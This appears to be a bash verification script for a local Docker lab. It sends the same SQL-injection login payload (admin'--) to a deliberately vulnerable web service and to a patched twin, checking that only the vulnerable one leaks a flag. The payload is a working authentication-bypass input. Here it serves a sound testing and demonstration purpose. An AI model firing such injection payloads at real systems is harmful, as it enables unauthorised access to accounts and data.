#!/usr/bin/env bash
#
# verify-differential.sh — proves The Crucible VALIDATES exploitability, it does not pattern-match
# a known flag. It fires the *identical* SQL-injection payload (`username=admin'--`) at two twins:
#
#   web-01          (vulnerable, string-built SQL)   -> EXPECT: flag returned      (exploitable)
#   web-01-patched  (fixed, parameterized query)     -> EXPECT: HTTP 401, no flag  (NOT exploitable)
#
# Same payload, opposite outcome, one line of code different between the targets. A tool that only
# recognised a flag string could never produce the correct NEGATIVE result on web-01-patched — that
# negative is the evidence the positive on web-01 was earned. This is the network-level companion to
# verify-arena.sh; run it before a demo to show the "reports NOT exploitable" beat deterministically.
#
# Usage:  bash arena/verify-differential.sh        (from the repo root)
# Requires: Docker daemon running.

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
COMPOSE="$HERE/docker-compose.yml"
CURL="curlimages/curl:latest"
EXPECTED_FLAG="crucible{sqli_auth_bypass_web01}"
PAYLOAD_USER="admin'--"

pass() { printf '  \033[32mPASS\033[0m %s\n' "$1"; }
fail() { printf '  \033[31mFAIL\033[0m %s\n' "$1"; exit 1; }

echo "== bringing up the arena (web-01 + web-01-patched) =="
docker compose -f "$COMPOSE" up -d --build --wait >/dev/null
docker pull -q "$CURL" >/dev/null

# Derive the actual arena network from a running container (robust to project-name overrides).
NET="$(docker inspect crucible-web-01 --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{end}}')"
[ -n "$NET" ] || fail "could not determine the arena network name from crucible-web-01"

run() { docker run --rm --network "$NET" "$CURL" "$@"; }

# Fire the SAME injection payload at a target; echo the response body.
inject() { run -s --max-time 5 -X POST "http://$1:5000/login" \
  --data-urlencode "username=$PAYLOAD_USER" --data-urlencode 'password=x'; }

echo "== [1] VULNERABLE target: web-01 =="
vuln_body="$(inject web-01)"
echo "$vuln_body" | grep -qF "$EXPECTED_FLAG" \
  && pass "web-01: injection returned the flag (EXPLOITABLE, as expected)" \
  || fail "web-01: injection did NOT return the flag (got: $vuln_body)"

echo "== [2] PATCHED control: web-01-patched (identical payload) =="
patched_body="$(inject web-01-patched)"
if echo "$patched_body" | grep -qF "$EXPECTED_FLAG"; then
  fail "web-01-patched leaked the flag — the patch is NOT effective (got: $patched_body)"
fi
# The parameterized query treats admin'-- as a literal (nonexistent) username -> unauthorized.
patched_status="$(run -s -o /dev/null -w '%{http_code}' --max-time 5 -X POST \
  "http://web-01-patched:5000/login" --data-urlencode "username=$PAYLOAD_USER" --data-urlencode 'password=x')"
[ "$patched_status" = "401" ] \
  && pass "web-01-patched: same payload rejected with 401, no flag (NOT exploitable, as expected)" \
  || fail "web-01-patched: expected 401 for the injection, got HTTP $patched_status"

echo "== [3] controls on the patched twin =="
wrong_status="$(run -s -o /dev/null -w '%{http_code}' --max-time 5 -X POST \
  "http://web-01-patched:5000/login" -d 'username=admin&password=wrong')"
[ "$wrong_status" = "401" ] \
  && pass "web-01-patched: wrong credentials rejected (401)" \
  || fail "web-01-patched: wrong creds did not 401 (got HTTP $wrong_status)"

legit_body="$(run -s --max-time 5 -X POST "http://web-01-patched:5000/login" \
  -d 'username=admin&password=s3cr3t-not-guessable-9f2a')"
echo "$legit_body" | grep -q '"authenticated":true' \
  && ! echo "$legit_body" | grep -qF "$EXPECTED_FLAG" \
  && pass "web-01-patched: legitimate credentials authenticate — and there is no flag to give up" \
  || fail "web-01-patched: legitimate-auth control behaved unexpectedly (got: $legit_body)"

echo
echo "== differential result =="
pass "IDENTICAL payload → web-01 EXPLOITABLE, web-01-patched NOT exploitable"
echo "The Crucible validates exploitability; it does not assume it. (Stop: docker compose -f arena/docker-compose.yml down)"
